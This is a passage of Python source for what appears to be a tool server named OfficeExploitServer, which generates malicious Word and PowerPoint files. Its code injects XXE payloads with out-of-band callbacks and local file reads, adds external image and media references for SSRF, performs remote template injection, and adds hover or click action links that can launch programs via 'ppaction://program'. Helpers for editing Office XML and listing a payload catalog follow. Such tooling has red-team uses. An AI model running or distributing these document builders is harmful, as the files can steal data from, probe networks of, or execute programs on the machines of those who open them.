            if payload_type not in valid_payload_types:
                raise ToolError(
                    message=f"Invalid payload_type: {payload_type}",
                    details=f"Valid types: {', '.join(str(t) for t in valid_payload_types if t)}"
                )

            path = self._validate_output_path(output_path)
            injection_locations = []

            # Create base DOCX
            buffer = self._create_minimal_docx(content or "")

            # Apply payload
            if payload_type == "xxe":
                xxe_payload = self._build_xxe_payload(xxe_style, xxe_callback_url, xxe_file_to_read)

                if xxe_target_xml == "multi":
                    targets = ["document", "settings", "styles"]
                else:
                    targets = [xxe_target_xml]

                content_dict = {}
                with zipfile.ZipFile(buffer, "r") as zf:
                    for name in zf.namelist():
                        content_dict[name] = zf.read(name)

                buffer = io.BytesIO()
                with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                    for name, data in content_dict.items():
                        xml_key = None
                        for key, xml_path in self.DOCX_XML_PATHS.items():
                            if name == xml_path:
                                xml_key = key
                                break

                        if xml_key and xml_key in targets:
                            data = self._inject_xxe_into_xml(data.decode("utf-8"), xxe_payload)
                            injection_locations.append(name)
                            zf.writestr(name, data)
                        else:
                            zf.writestr(name, data)

                buffer.seek(0)

            elif payload_type == "external_image":
                if not external_url:
                    raise ToolError(message="external_url required for external_image payload")
                buffer = self._add_docx_external_image(buffer, external_url)
                injection_locations.append("word/document.xml")
                injection_locations.append("word/_rels/document.xml.rels")

            elif payload_type == "template_injection":
                if not template_url:
                    raise ToolError(message="template_url required for template_injection payload")
                buffer = self._add_docx_template_injection(buffer, template_url, template_type)
                injection_locations.append("word/settings.xml")
                injection_locations.append("word/_rels/settings.xml.rels")

            # Write to file
            data = buffer.getvalue()
            path.write_bytes(data)

            return self._build_result(
                path=path,
                data=data,
                payload_type=payload_type or "none",
                injection_locations=injection_locations,
            )

        except ToolError:
            raise
        except Exception as e:
            self.logger.exception("Error creating DOCX")
            raise ToolError(message="Failed to create DOCX", details=str(e))

    # =========================================================================
    # PPTX GENERATION
    # =========================================================================

    def _create_minimal_pptx(self) -> io.BytesIO:
        """Create minimal valid PPTX structure."""
        buffer = io.BytesIO()

        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            # [Content_Types].xml
            content_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="{self.CONTENT_TYPES_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>
  <Override PartName="/ppt/slides/slide1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/slideMasters/slideMaster1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/>
</Types>'''
            zf.writestr("[Content_Types].xml", content_types)

            # _rels/.rels
            rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/>
</Relationships>'''
            zf.writestr("_rels/.rels", rels)

            # ppt/presentation.xml
            presentation = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="{self.PPTX_NS['p']}" xmlns:r="{self.PPTX_NS['r']}" xmlns:a="{self.PPTX_NS['a']}">
  <p:sldMasterIdLst>
    <p:sldMasterId id="2147483648" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
  </p:sldIdLst>
</p:presentation>'''
            zf.writestr("ppt/presentation.xml", presentation)

            # ppt/_rels/presentation.xml.rels
            pres_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/>
</Relationships>'''
            zf.writestr("ppt/_rels/presentation.xml.rels", pres_rels)

            # ppt/slides/slide1.xml
            slide = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="{self.PPTX_NS['p']}" xmlns:r="{self.PPTX_NS['r']}" xmlns:a="{self.PPTX_NS['a']}">
  <p:cSld>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr/>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="TextBox 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect"/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:t>Click here</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
</p:sld>'''
            zf.writestr("ppt/slides/slide1.xml", slide)

            # ppt/slides/_rels/slide1.xml.rels
            slide_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
</Relationships>'''
            zf.writestr("ppt/slides/_rels/slide1.xml.rels", slide_rels)

            # ppt/slideLayouts/slideLayout1.xml
            layout = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldLayout xmlns:p="{self.PPTX_NS['p']}" xmlns:a="{self.PPTX_NS['a']}" xmlns:r="{self.PPTX_NS['r']}" type="blank">
  <p:cSld>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr/>
    </p:spTree>
  </p:cSld>
</p:sldLayout>'''
            zf.writestr("ppt/slideLayouts/slideLayout1.xml", layout)

            # ppt/slideLayouts/_rels/slideLayout1.xml.rels
            layout_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="../slideMasters/slideMaster1.xml"/>
</Relationships>'''
            zf.writestr("ppt/slideLayouts/_rels/slideLayout1.xml.rels", layout_rels)

            # ppt/slideMasters/slideMaster1.xml
            master = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldMaster xmlns:p="{self.PPTX_NS['p']}" xmlns:a="{self.PPTX_NS['a']}" xmlns:r="{self.PPTX_NS['r']}">
  <p:cSld>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr/>
    </p:spTree>
  </p:cSld>
  <p:sldLayoutIdLst>
    <p:sldLayoutId id="2147483649" r:id="rId1"/>
  </p:sldLayoutIdLst>
</p:sldMaster>'''
            zf.writestr("ppt/slideMasters/slideMaster1.xml", master)

            # ppt/slideMasters/_rels/slideMaster1.xml.rels
            master_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{self.RELS_NS}">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
</Relationships>'''
            zf.writestr("ppt/slideMasters/_rels/slideMaster1.xml.rels", master_rels)

        buffer.seek(0)
        return buffer

    def _add_pptx_action_link(
        self,
        buffer: io.BytesIO,
        action_target: str,
        trigger: str,
        action: str
    ) -> io.BytesIO:
        """Add action link to PPTX slide."""
        content = {}
        with zipfile.ZipFile(buffer, "r") as zf:
            for name in zf.namelist():
                content[name] = zf.read(name)

        new_buffer = io.BytesIO()
        with zipfile.ZipFile(new_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for name, data in content.items():
                if name == "ppt/slides/slide1.xml":
                    data = data.decode("utf-8")

                    # Determine action element based on trigger
                    if trigger == "hover":
                        action_elem = "hlinkHover"
                    else:
                        action_elem = "hlinkClick"

                    # Build action based on type
                    if action == "program":
                        action_attr = f'action="ppaction://program" r:id="rId100"'
                    else:
                        action_attr = f'r:id="rId100"'

                    # Add action to the shape's cNvPr
                    action_xml = f'''
          <a:{action_elem} {action_attr}/>'''

                    # Insert after cNvPr id attribute
                    data = re.sub(
                        r'(<p:cNvPr id="2" name="TextBox 1")(/?>)',
                        rf'\1>\n{action_xml}\n        </p:cNvPr>',
                        data
                    )
                    zf.writestr(name, data)

                elif name == "ppt/slides/_rels/slide1.xml.rels":
                    data = data.decode("utf-8")
                    data = data.replace(
                        "</Relationships>",
                        f'  <Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="{action_target}" TargetMode="External"/>\n</Relationships>'
                    )
                    zf.writestr(name, data)
                else:
                    zf.writestr(name, data)

        new_buffer.seek(0)
        return new_buffer

    def _add_pptx_external_media(self, buffer: io.BytesIO, external_url: str) -> io.BytesIO:
        """Add external media reference to PPTX for SSRF."""
        content = {}
        with zipfile.ZipFile(buffer, "r") as zf:
            for name in zf.namelist():
                content[name] = zf.read(name)

        new_buffer = io.BytesIO()
        with zipfile.ZipFile(new_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for name, data in content.items():
                if name == "ppt/slides/_rels/slide1.xml.rels":
                    data = data.decode("utf-8")
                    data = data.replace(
                        "</Relationships>",
                        f'  <Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{external_url}" TargetMode="External"/>\n</Relationships>'
                    )
                    zf.writestr(name, data)
                elif name == "ppt/slides/slide1.xml":
                    # Add picture element referencing external media
                    data = data.decode("utf-8")
                    pic_xml = f'''
      <p:pic xmlns:p="{self.PPTX_NS['p']}" xmlns:r="{self.PPTX_NS['r']}" xmlns:a="{self.PPTX_NS['a']}">
        <p:nvPicPr>
          <p:cNvPr id="100" name="External Image"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:link="rId100"/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="100" cy="100"/>
          </a:xfrm>
          <a:prstGeom prst="rect"/>
        </p:spPr>
      </p:pic>'''
                    data = data.replace("</p:spTree>", pic_xml + "\n    </p:spTree>")
                    zf.writestr(name, data)
                else:
                    zf.writestr(name, data)

        new_buffer.seek(0)
        return new_buffer

    async def create_pptx(
        self,
        output_path: str,
        payload_type: Optional[str] = None,
        xxe_style: str = "oob_http",
        xxe_target_xml: str = "presentation",
        xxe_callback_url: Optional[str] = None,
        xxe_file_to_read: Optional[str] = None,
        external_url: Optional[str] = None,
        trigger: str = "hover",
        action: str = "hyperlink",
        action_target: Optional[str] = None,
    ) -> ToolResult:
        """Create a malicious PPTX file."""
        try:
            # Validate payload_type if provided
            valid_payload_types = (None, "xxe", "external_media", "action_link")
            if payload_type not in valid_payload_types:
                raise ToolError(
                    message=f"Invalid payload_type: {payload_type}",
                    details=f"Valid types: {', '.join(str(t) for t in valid_payload_types if t)}"
                )

            path = self._validate_output_path(output_path)
            injection_locations = []

            # Create base PPTX
            buffer = self._create_minimal_pptx()

            # Apply payload
            if payload_type == "xxe":
                xxe_payload = self._build_xxe_payload(xxe_style, xxe_callback_url, xxe_file_to_read)

                if xxe_target_xml == "multi":
                    targets = ["presentation", "slide1"]
                else:
                    targets = [xxe_target_xml]

                content = {}
                with zipfile.ZipFile(buffer, "r") as zf:
                    for name in zf.namelist():
                        content[name] = zf.read(name)

                buffer = io.BytesIO()
                with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                    for name, data in content.items():
                        xml_key = None
                        for key, xml_path in self.PPTX_XML_PATHS.items():
                            if name == xml_path:
                                xml_key = key
                                break

                        if xml_key and xml_key in targets:
                            data = self._inject_xxe_into_xml(data.decode("utf-8"), xxe_payload)
                            injection_locations.append(name)
                            zf.writestr(name, data)
                        else:
                            zf.writestr(name, data)

                buffer.seek(0)

            elif payload_type == "external_media":
                if not external_url:
                    raise ToolError(message="external_url required for external_media payload")
                buffer = self._add_pptx_external_media(buffer, external_url)
                injection_locations.append("ppt/slides/slide1.xml")
                injection_locations.append("ppt/slides/_rels/slide1.xml.rels")

            elif payload_type == "action_link":
                if not action_target:
                    raise ToolError(message="action_target required for action_link payload")
                buffer = self._add_pptx_action_link(buffer, action_target, trigger, action)
                injection_locations.append("ppt/slides/slide1.xml")
                injection_locations.append("ppt/slides/_rels/slide1.xml.rels")

            # Write to file
            data = buffer.getvalue()
            path.write_bytes(data)

            return self._build_result(
                path=path,
                data=data,
                payload_type=payload_type or "none",
                injection_locations=injection_locations,
            )

        except ToolError:
            raise
        except Exception as e:
            self.logger.exception("Error creating PPTX")
            raise ToolError(message="Failed to create PPTX", details=str(e))

    # =========================================================================
    # LOW-LEVEL XML MANIPULATION
    # =========================================================================

    async def modify_office_xml(
        self,
        input_path: str,
        output_path: str,
        xml_file: str,
        modifications: List[Dict],
    ) -> ToolResult:
        """Modify XML within an Office document."""
        try:
            out_path = self._validate_output_path(output_path)
            in_path = Path(input_path)

            if not in_path.exists():
                raise ToolError(message=f"Input file not found: {input_path}")

            # Read and modify
            content = {}
            with zipfile.ZipFile(in_path, "r") as zf:
                for name in zf.namelist():
                    content[name] = zf.read(name)

            if xml_file not in content:
                raise ToolError(
                    message=f"XML file not found in archive: {xml_file}",
                    details=f"Available files: {', '.join(sorted(content.keys()))}"
                )

            # Parse and modify XML
            xml_content = content[xml_file].decode("utf-8")

            for mod in modifications:
                xpath = mod.get("xpath")
                action = mod.get("action")
                mod_content = mod.get("content", "")

                if action == "replace":
                    # Simple string replacement based on xpath pattern
                    # For full XPath support, would need lxml
                    try:
                        tree = etree.fromstring(xml_content.encode("utf-8"))
                        elements = tree.xpath(xpath, namespaces={
                            "w": self.DOCX_NS["w"],
                            "r": self.DOCX_NS["r"],
                            "p": self.PPTX_NS["p"],
                            "a": self.PPTX_NS["a"],
                            "main": self.XLSX_NS["main"],
                        })
                        for elem in elements:
                            if mod_content.startswith("<"):
                                new_elem = etree.fromstring(mod_content.encode("utf-8"))
                                elem.getparent().replace(elem, new_elem)
                            else:
                                elem.text = mod_content
                        xml_content = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' + etree.tostring(tree, encoding="unicode")
                    except Exception as e:
                        raise ToolError(message=f"XPath replace failed: {e}")

                elif action == "insert":
                    # Insert content before closing tag matching xpath
                    try:
                        tree = etree.fromstring(xml_content.encode("utf-8"))
                        elements = tree.xpath(xpath, namespaces={
                            "w": self.DOCX_NS["w"],
                            "r": self.DOCX_NS["r"],
                            "p": self.PPTX_NS["p"],
                            "a": self.PPTX_NS["a"],
                            "main": self.XLSX_NS["main"],
                        })
                        for elem in elements:
                            new_elem = etree.fromstring(mod_content.encode("utf-8"))
                            elem.append(new_elem)
                        xml_content = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' + etree.tostring(tree, encoding="unicode")
                    except Exception as e:
                        raise ToolError(message=f"XPath insert failed: {e}")

                elif action == "delete":
                    try:
                        tree = etree.fromstring(xml_content.encode("utf-8"))
                        elements = tree.xpath(xpath, namespaces={
                            "w": self.DOCX_NS["w"],
                            "r": self.DOCX_NS["r"],
                            "p": self.PPTX_NS["p"],
                            "a": self.PPTX_NS["a"],
                            "main": self.XLSX_NS["main"],
                        })
                        for elem in elements:
                            elem.getparent().remove(elem)
                        xml_content = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' + etree.tostring(tree, encoding="unicode")
                    except Exception as e:
                        raise ToolError(message=f"XPath delete failed: {e}")

            content[xml_file] = xml_content.encode("utf-8")

            # Write modified archive
            buffer = io.BytesIO()
            with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                for name, data in content.items():
                    zf.writestr(name, data)

            data = buffer.getvalue()
            out_path.write_bytes(data)

            return self._build_result(
                path=out_path,
                data=data,
                payload_type="custom_modification",
                injection_locations=[xml_file],
            )

        except ToolError:
            raise
        except Exception as e:
            self.logger.exception("Error modifying Office XML")
            raise ToolError(message="Failed to modify Office XML", details=str(e))

    async def extract_office_xml(
        self,
        input_path: str,
        xml_file: Optional[str] = None,
    ) -> ToolResult:
        """Extract XML from Office document."""
        try:
            in_path = Path(input_path)

            if not in_path.exists():
                raise ToolError(message=f"Input file not found: {input_path}")

            with zipfile.ZipFile(in_path, "r") as zf:
                file_list = zf.namelist()

                if xml_file:
                    if xml_file not in file_list:
                        raise ToolError(
                            message=f"XML file not found: {xml_file}",
                            details=f"Available files: {', '.join(sorted(file_list))}"
                        )
                    content = zf.read(xml_file).decode("utf-8", errors="replace")
                    return ToolResult(
                        success=True,
                        data={
                            "file": xml_file,
                            "content": content,
                            "size_bytes": len(content),
                        },
                    )
                else:
                    # List all files
                    files = []
                    for name in sorted(file_list):
                        info = zf.getinfo(name)
                        files.append({
                            "path": name,
                            "size_bytes": info.file_size,
                            "compressed_size_bytes": info.compress_size,
                        })
                    return ToolResult(
                        success=True,
                        data={
                            "file_count": len(files),
                            "files": files,
                        },
                    )

        except ToolError:
            raise
        except Exception as e:
            self.logger.exception("Error extracting Office XML")
            raise ToolError(message="Failed to extract Office XML", details=str(e))

    async def list_payloads(
        self,
        file_type: Optional[str] = None,
        category: Optional[str] = None,
    ) -> ToolResult:
        """List available payload templates."""
        result = {}

        for ft, categories in self.PAYLOAD_CATALOG.items():
            if file_type and ft != file_type:
                continue

            result[ft] = {}
            for cat, payloads in categories.items():
                if category and cat != category:
                    continue
                result[ft][cat] = payloads

        # Clean up empty entries
        result = {k: v for k, v in result.items() if v}

        return ToolResult(
            success=True,
            data={
                "payloads": result,
                "note": "Use create_xlsx, create_docx, or create_pptx with the appropriate payload_type and options.",
            },
        )


if __name__ == "__main__":
    OfficeExploitServer.main()
